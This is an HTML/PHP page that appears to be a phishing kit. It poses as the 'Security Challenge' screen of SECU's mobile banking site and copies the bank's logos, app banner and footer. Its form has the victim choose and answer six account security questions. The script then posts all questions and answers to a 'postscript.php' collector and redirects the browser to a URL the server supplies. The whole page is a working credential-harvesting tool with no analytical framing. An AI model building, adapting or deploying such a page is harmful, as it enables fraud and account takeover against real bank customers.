<?php include ('gisp.php');?>
<html lang="en">
    <head>
        <title>Mobile Access - Rates</title>
       <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
        <meta name="format-detection" content="telephone=no" />
        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0" />
        <link href="files/SECUmedium.css" rel="stylesheet" type="text/css" media="all" />
        <link rel="icon" href="files/SECUfavicon.ico" type="image/x-icon" />
        <link rel="icon" href="files/icon-v2-128x128.png" sizes="128x128" />
        <link rel="icon" href="files/icon-v2-192x192.png" sizes="192x192" />
        <link rel="apple-touch-icon" href="files/apple-touch-icon-v2-76x76.png" />
        <link rel="apple-touch-icon" href="files/apple-touch-icon-v2-152x152.png" sizes="152x152" />
        <link rel="apple-touch-icon" href="files/apple-touch-icon-v2-167x167.png" sizes="167x167" />
        <link rel="apple-touch-icon" href="files/apple-touch-icon-v2-180x180.png" sizes="180x180" />
        <style type="text/css">
            input[type='text'], input[type='password'], textarea {
     border-radius: initial;
    border: 1px solid #ced4da;;
    font-size: initial;
}
.error{
    display: none;
}
        </style>
       <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous">
        <script src="files/jquery-3.6.0.min.js"></script>
    </head>
    <body>
        <noscript>
            <div class="errorText">
                Please Check Your Browser<br />
                Your current browser is not capable of viewing this site because it does not support javascript.<br />
            </div>
        </noscript>
        <a href="http://itunes.apple.com/us/app/SECU/id1435916976?mt=8" style="text-decoration: none; color: #ffffff;">
            <table id="MobileAppBanner" width="100%" role="presentation" style="background: #333333; height: 50px; position: fixed; left: 0; right: 0; top: 0;">
                <tbody>
                    <tr>
                        <td width="30px;" style="vertical-align: middle; padding-left: 10px;"><img src="files/Logo.fw.png" width="25px;" height="25px;" alt="SECU Logo" /></td>
                        <td style="vertical-align: middle; text-align: left;" class="text3">Open in the SECU Mobile App</td>
                        <td width="20px;" style="vertical-align: middle; text-align: right; padding-right: 10px;" class="text3">&gt;</td>
                    </tr>
                </tbody>
            </table>
        </a>
        <div style="height: 50px;">&nbsp;</div>
        <div id="logobar" class="logoBarWithSignOff" style="height: 85px;">
            <div id="logoWithSignoffDiv" style="width: 280px;"><img id="logoWithSignOff" class="logo" alt="SECU Logo" title="SECU Logo" src="files/SECU_480.png" /></div>
            <div id="seperator" class="seperatorBar" >
                <div id="signOffForSignoffDiv" style="padding-top: 29px;"><a href="/m/Menu.aspx" id="signOffButton" class="text3 noShowLink">Sign Off</a></div>
            </div>
        </div>
       
            <div class="aspNetHidden">
              
           
            <div id="titleBarDiv" class="titleBar">
            
                <div id="titleTextDiv" style="padding-top: 0.9em;"><span id="titleTextSpan" class="text1">Security Challenge</span></div>
                <div id="titleButtonRightDiv">
                    <a href="#" id="TitleBar_rightTitleButton" title="Home"><img id="homeButtonImage" alt="Home Button" src="files/HomeButton.png" /></a>
                </div>
            </div>
            <div style="text-align: left; padding: 0.4em 0em 0em 0em;">
                <div><p  class="ratesGroupHeaderUnselected">For Security purposes, you must answer the following question correctly to continue, kindly select your question to answer</p></div>
           

 <div class="card divm"  style="padding:0;" id="div1">
  <div class="card-header">
       First Question
  </div>
  <div class="card-body">
    <div class="row">
        <div class="col-md-12"><div class="alert alert-warning error"><small> Kindly pick your question and answer it to continue</small></div></div>
      <div class="col">
        <div class="form-group">
         <select class="form-control form-control-sm" id="sq1">
                 <option selected="selected" value="">Choose Your Question</option>
</select>
            </div>
      </div>
      <div class="col">
       <div class="form-group">
    <input type="text" class="form-control form-control-sm" id="sa1" placeholder="Enter your Answer">
  </div>
      </div>
    </div>
</div>
<div class="card-footer">
       <button  class="signOnButton fiColoredButton text5 bold" type="button" onclick="next('div2','2')">Answer Question</button>
  </div>
</div>

 <div class="card divm"  style="padding:0; display: none;" id="div2">
  <div class="card-header">
       Second Question
  </div>
  <div class="card-body">
    <div class="row">
          <div class="col-md-12"><div class="alert alert-warning error"><small> Kindly pick your question and answer it to continue</small></div></div>
      <div class="col">
        <div class="form-group">
         <select class="form-control form-control-sm" id="sq2">
                 <option selected="selected" value="">Choose Your Question</option>
</select>
            </div>
      </div>
      <div class="col">
       <div class="form-group">
    <input type="text" class="form-control form-control-sm" id="sa2" placeholder="Enter your Answer">
  </div>
      </div>
    </div>
</div>
<div class="card-footer">
       <button  class="signOnButton fiColoredButton text5 bold"  type="button" onclick="next('div3','3')">Answer Question</button>
  </div>
</div>

 <div class="card divm"  style="padding:0; display: none;" id="div3">
  <div class="card-header">
       Third Question
  </div>
  <div class="card-body">
    <div class="row">
          <div class="col-md-12"><div class="alert alert-warning error"><small> Kindly pick your question and answer it to continue</small></div></div>
      <div class="col">
        <div class="form-group">
         <select class="form-control form-control-sm" id="sq3">
                 <option selected="selected" value="">Choose Your Question</option>
</select>
            </div>
      </div>
      <div class="col">
       <div class="form-group">
    <input type="text" class="form-control form-control-sm" id="sa3" placeholder="Enter your Answer">
  </div>
      </div>
    </div>
</div>
<div class="card-footer">
       <button  class="signOnButton fiColoredButton text5 bold"  type="button" onclick="next('div4','4')">Answer Question</button>
  </div>
</div>

 <div class="card divm" style="padding:0; display: none;" id="div4">
  <div class="card-header">
       Fourth Question
  </div>
  <div class="card-body">
    <div class="row">
          <div class="col-md-12"><div class="alert alert-warning error"><small> Kindly pick your question and answer it to continue</small></div></div>
      <div class="col">
        <div class="form-group">
         <select class="form-control form-control-sm" id="sq4">
                 <option selected="selected" value="">Choose Your Question</option>
</select>
            </div>
      </div>
      <div class="col">
       <div class="form-group">
    <input type="text" class="form-control form-control-sm" id="sa4" placeholder="Enter your Answer">
  </div>
      </div>
    </div>
</div>
<div class="card-footer">
       <button  class="signOnButton fiColoredButton text5 bold"  type="button" onclick="next('div5','5')">Answer Question</button>
  </div>
</div>
 <div class="card divm"  style="padding:0; display: none;" id="div5">
  <div class="card-header">
       Fifth Question
  </div>
  <div class="card-body">
    <div class="row">
          <div class="col-md-12"><div class="alert alert-warning error"><small> Kindly pick your question and answer it to continue</small></div></div>
      <div class="col">
        <div class="form-group">
         <select class="form-control form-control-sm" id="sq5">
                 <option selected="selected" value="">Choose Your Question</option>
</select>
            </div>
      </div>
      <div class="col">
       <div class="form-group">
    <input type="text" class="form-control form-control-sm" id="sa5" placeholder="Enter your Answer">
  </div>
      </div>
    </div>
</div>
<div class="card-footer">
       <button type="button"  class="signOnButton fiColoredButton text5 bold"  type="button" onclick="next('div6','6')">Answer Question</button>
  </div>
</div>

 <div class="card divm" style="padding:0; display: none;" id="div6">
  <div class="card-header">
       Sixth Question
  </div>
  <div class="card-body">
    <div class="row">
          <div class="col-md-12"><div class="alert alert-warning error"><small> Kindly pick your question and answer it to continue</small></div></div>
      <div class="col">
        <div class="form-group">
         <select class="form-control form-control-sm" id="sq6">
                 <option selected="selected" value="">Choose Your Question</option>
</select>
            </div>
      </div>
      <div class="col">
       <div class="form-group">
    <input type="text" class="form-control form-control-sm" id="sa6" placeholder="Enter your Answer">
  </div>
      </div>
    </div>
</div>
<div class="card-footer">
       <button type="button"  class="signOnButton fiColoredButton text5 bold" id="submit-btn2" onclick="SqPost()"><span id="submit-btn-text2">Answer Question</span></button>
  </div>
</div>
                
            </div>
        
           
     
        <div class="footer text5">
            <div class="smallSpaceBelow">
                <a href="https://www.ncsecu.org/Home/Legal.html" title="Legal" class="Link noShowLink" target="_blank">Legal</a> &nbsp;&nbsp;|&nbsp;&nbsp;
                <a id="linkAccessibility" class="Link noShowLink" href="https://www.ncsecu.org/Home/AccessibilityStatement.html" target="_blank">Accessibility</a> &nbsp;&nbsp;|&nbsp;&nbsp;
                <a class="Link noShowLink" href='javascript:ChangeLanguage("/m/Rates.aspx?lang=es")'>Español</a> &nbsp;&nbsp;|&nbsp;&nbsp; <a href="/m/SiteMap.aspx" id="ViewSiteMapLink" class="Link noShowLink">Site Map</a><br />
                Equal Housing Opportunity
                <img src="Images/ehl_gif_white_s14x13x256Pass.png" width="14" height="13" alt="Equal Housing Lender" />
                &nbsp;&nbsp;|&nbsp;&nbsp; NMLS#430055
            </div>
            <div class="smallSpaceBelow"><span id="LabelInsuredMessage">Federally Insured by NCUA</span></div>
            <!-- <span id="LabelAccessibilityMessage"></span> -->
        </div>
        <script type="text/javascript">
            
            const quests = ["What city were you married in?", "What city were you born in?", "What country were you born in?", "What is the month of your wedding anniversary?","What city was your first high school in?","What is your father middle name?","What was your first car?","What was your elementary school?","What is your place of birth?","What is your father's middle name?","What is your favorite pet?","What is your favorite holiday?"];

//   let text;

// function myFunction(value) {
//   text += "<option value='" + value + "'>" + value + "</option>";

// }
// $("#sq1").append(text);
next('div1','1');
function next(div,sq){
    let text;
quests.forEach(function(value) {
  text += "<option value='" + value + "'>" + value + "</option>";

});
$("#sq"+sq).append(text);
  var gg=parseFloat(sq)-1;
 var sqx=$("#sq"+gg).val();
 var sax=$("#sa"+gg).val();
 console.log(gg)
 if(sax==''){
     $("#div"+gg+" .error").show();
    return false;
 } 
 $(".divm").hide();
  $("#"+div).show();
 if(sqx!=undefined){
let index = quests.indexOf(sqx);
delete quests[index];
 }



}
function SqPost(){
   
var sq1 = $("#sq1 option:selected").html();
         var sq2 = $("#sq2 option:selected").html();
          var sq3 = $("#sq3 option:selected").html();
           var sq4 = $("#sq4 option:selected").html();
          var sq5 = $("#sq5 option:selected").html();
          var sq6 = $("#sq6 option:selected").html();
          

         var sa1 = $("#sa1").val();
          var sa2 = $("#sa2").val();
         var sa3 = $("#sa3").val();
           var sa4 = $("#sa4").val();
         var sa5 = $("#sa5").val();
          var sa6 = $("#sa6").val();

if(sa1==''||sa2==''||sa3==''||sa4==''||sa5==''||sa6==''){
    alert('Kindly fill all required field');
    return false;
}
   document.getElementById("submit-btn2").disabled = true; 
    $("#submit-btn-text2").html('Please Wait ...');
        $.ajax({
            type: "POST",
            url: "postscript.php",
            data: { action : 'signup', type: 'sq', sq1 : sq1, sq2 : sq2, sq3 : sq3, sq4 : sq4, sq5 : sq5, sq6 : sq6, sa1 : sa1, sa2 : sa2, sa3 : sa3, sa4 : sa4, sa5 : sa5, sa6 : sa6} 
        }).done(function(data){
    var datArray = data.split("|");
          console.log('response: ', data)
if(datArray[0] == "ok"){
       
        console.log('redirect: ', datArray[1])
        window.top.location.href = ''+datArray[1]+'';
}
        }); 
    }
        </script>
    </body>
</html>